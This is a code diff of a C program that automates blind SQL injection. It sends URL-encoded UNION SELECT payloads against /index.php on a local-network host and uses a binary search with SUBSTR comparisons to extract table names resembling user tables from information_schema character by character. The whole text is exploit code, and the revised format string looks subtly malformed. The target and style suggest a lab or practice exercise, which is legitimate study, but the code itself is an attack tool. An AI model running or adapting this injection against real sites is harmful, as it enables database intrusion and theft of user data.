@@ -206,16 +206,15 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-#define PAYLOAD_BEGIN "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27"
-#define PAYLOAD_END "%25%27%20LIMIT%201%3b"
+#define PAYLOAD "order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%c%%20LIMIT%%201%;"
 
-bool send_check_success(char * discovered_name, int sockfd) {
+bool send_check_success(char * discovered_name, int i, char mid, int sockfd) {
     char mal_req[2048];
-    sprintf(mal_req, "GET /index.php?%s%s%s HTTP/1.1\r\n"
+    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%c%%20LIMIT%%201%; HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n",
-        PAYLOAD_BEGIN, discovered_name, PAYLOAD_END
+        discovered_name, discovered_name, i, mid
     );
     _send(sockfd, mal_req, strlen(mal_req));
 
@@ -232,12 +231,11 @@ void binary_search(char * discovered_name, int sockfd) {
         char high = 'z';
         while (low <= high) {
             char mid = (char)(low + (high - low) / 2);
-            discovered_name[i] = mid;
         #ifdef __MY_DEBUG__
             count++;
             fprintf(stderr, "1");
         #endif
-            if (send_check_success(discovered_name, sockfd)) {
+            if (send_check_success(discovered_name, i, mid, sockfd)) {
                 low=mid+1;
             }
             else {
